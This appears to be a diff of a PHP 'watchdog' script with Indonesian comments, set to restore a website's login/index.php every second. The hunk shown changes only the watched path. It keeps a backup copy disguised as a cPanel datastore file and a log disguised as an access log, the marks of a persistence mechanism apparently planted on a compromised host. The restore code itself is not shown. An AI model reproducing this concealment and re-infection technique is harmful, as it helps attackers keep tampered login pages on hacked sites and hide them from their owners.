@@ -2,7 +2,7 @@
 // watchdog_background.php - VERSI OPTIMASI
 // Perubahan: interval 1 detik, langsung restore, cache hash backup
 
-$file_asli   = '/home/public_html/login/index.php';
+$file_asli   = '/home/megapres639/public_html/login/index.php';
 $file_backup = '/home/megapres639/.cpanel/datastore/_Cpanel::Quota.pm__megapres637';
 $log_file    = '/home/megapres639/access-logs/megapress.co.id_logs';
 
